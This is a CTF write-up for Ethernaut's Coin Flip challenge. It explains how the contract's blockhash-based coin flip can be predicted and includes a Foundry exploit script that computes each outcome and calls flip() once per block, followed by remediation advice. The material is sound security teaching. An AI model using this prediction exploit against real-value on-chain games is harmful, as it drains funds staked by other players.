# Coin Flip — Security Writeup

| | |
|---|---|
| **Challenge** | [Ethernaut 03 — Coin Flip](https://smartcontractshacking.com/tools/web3-ctf-challenges/ethernaut-coin-flip) |
| **Platform** | Smart Contracts Hacking (SCH) / OpenZeppelin Ethernaut |
| **Target** | `src/CoinFlip.sol` |
| **Solidity** | `^0.8.0` |
| **Severity** | Critical (for any real-value game) |
| **Status** | Exploited — local PoC passing |

---

## Executive summary

`CoinFlip` pretends to flip a fair coin by reading `blockhash(block.number - 1)` and comparing against `FACTOR` (`2^255`). That value is public and identical for every transaction in the current block, so an attacker recomputes the exact outcome and always guesses correctly.

`lastHash` only blocks a second flip in the same block. Across ten successive blocks, `consecutiveWins` reaches 10 with certainty.

**Impact:** guaranteed win streak; any ETH or tokens staked on this “random” game would be drained by a predictive attacker.

---

## Challenge objectives

| # | Condition | How verified |
|---|-----------|--------------|
| 1 | Win 10 times in a row | `coinflipInstance.consecutiveWins() == 10` |

**Starting facts (SCH):**

- Goal: `consecutiveWins` reaches 10
- SCH invokes your `run()` **once per block** until the goal is met
- Do not flip twice in the same block (`lastHash` will revert)

---

## Contract overview

```solidity
contract CoinFlip {
    consecutiveWins   // public streak counter
    lastHash          // previous blockValue used
    FACTOR            // 2^255

    flip(bool _guess) // derives side from prior blockhash; updates streak
}
```

---

## Finding

### [C-01] Predictable PRNG via public `blockhash`

| Field | Detail |
|-------|--------|
| **Severity** | Critical |
| **Bug class** | Weak / on-chain randomness |
| **Location** | `src/CoinFlip.sol:9-26` (`flip`) |
| **CWE** | [CWE-338](https://cwe.mitre.org/data/definitions/338.html) — Use of Cryptographically Weak PRNG |
| **SWC** | [SWC-120](https://swcregistry.io/docs/SWC-120) — Weak Sources of Randomness |

#### Description

The coin side is:

```text
side = (uint256(blockhash(block.number - 1)) / 2^255) == 1
```

`blockhash` of the previous block is already finalized and visible. Any contract or off-chain script can evaluate the same expression in the same block and pass the matching `_guess`.

#### Root cause

| Assumption | Reality |
|------------|---------|
| Players cannot know the next flip | Flip is determined by data already on-chain |
| `lastHash` makes it hard | Only rate-limits to 1 flip / block |

#### Vulnerable code

```9:26:web3-ctf-challenges/03-ethernaut-coin-flip/src/CoinFlip.sol
    function flip(bool _guess) public returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        if (lastHash == blockValue) {
            revert();
        }
        lastHash = blockValue;
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        if (side == _guess) {
            consecutiveWins++;
            return true;
        } else {
            consecutiveWins = 0;
            return false;
        }
    }
```

#### Impact

- CTF: reach 10 consecutive wins in 10 blocks.
- Production: attacker wins every round of a paid coin-flip / lottery built this way.

#### Likelihood

**Certain**, given the attacker can send a tx each block (or use an attacker contract that computes and calls in one tx).

#### Proof of concept

```bash
cd web3-ctf-challenges/03-ethernaut-coin-flip
forge test --match-test testExploit -vv
```

**Result:**

```
[PASS] testExploit() (gas: 414251)
```

---

## Attack scenario

### Preconditions

- Attacker can submit one transaction per block (SCH does this for you).
- Enough gas for 10 flips.

### Attack sequence

```
Block N:   compute side from blockhash(N-1) → flip(side) → wins = 1
Block N+1: compute side from blockhash(N)   → flip(side) → wins = 2
...
Block N+9: compute side                     → flip(side) → wins = 10  ✓
```

### Step-by-step (7-question gate)

| Step | Answer |
|------|--------|
| **1. Setup** | EOA / script with gas; copy `FACTOR` |
| **2. Call** | `flip(blockhash(n-1) / FACTOR == 1)` once per block × 10 |
| **3. Result** | `consecutiveWins == 10` |
| **4. Cost** | Gas only |
| **5. ROI** | 100% win rate vs intended ~0.1% for 10-in-a-row |
| **6. Privileged access?** | No |
| **7. Viable?** | Yes |

---

## Exploit implementation

### SCH platform (`Exploit.s.sol`)

Paste only the `run()` body. SCH re-runs it each block:

```solidity
function run() external {
    vm.startBroadcast(PLAYER_PRIVATE_KEY);

    uint256 factor = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    uint256 blockValue = uint256(blockhash(block.number - 1));
    bool side = blockValue / factor == 1;
    coinflipInstance.flip(side);

    vm.stopBroadcast();
}
```

### Local Foundry test

Loop with `vm.roll` between flips — see `test/CoinFlipExploit.t.sol`.

An on-chain attacker contract pattern (classic Ethernaut) is equivalent: deploy a helper that computes `side` and calls `flip(side)` in the same transaction; invoke the helper 10 times across 10 blocks.

---

## Verification checklist

- [x] Each of 10 flips returns `true`
- [x] `consecutiveWins == 10`
- [x] Local Foundry test passes

---

## Remediation

### Recommended fix

Do not use `blockhash`, `block.timestamp`, `block.prevrandao`, or `msg.sender` alone as randomness for adversarial games.

Options:

1. **Chainlink VRF** (or similar) — request random words; settle after fulfillment.
2. **Commit-reveal** — players commit a hash; reveal after a future block; combine with future entropy.

### Keep the rate limit

`lastHash` (or a per-block mapping) is still useful against spam, but it is **not** a randomness fix.

---

## Key lessons

1. **On-chain data is not secret** — if the contract can compute the answer, so can the attacker in the same tx.
2. **Rate limits ≠ entropy** — one flip per block still loses if every flip is predictable.
3. **`2^255` is just an MSB mask** — looks mysterious; it is not randomness.

---

## References

- [OpenZeppelin Ethernaut — Coin Flip](https://ethernaut.openzeppelin.com/level/3)
- [SCH Coin Flip challenge](https://smartcontractshacking.com/tools/web3-ctf-challenges/ethernaut-coin-flip)
- [SWC-120: Weak Sources of Randomness](https://swcregistry.io/docs/SWC-120)
- Local artifacts: `Exploit.s.sol`, `script/Exploit.s.sol`, `test/CoinFlipExploit.t.sol`
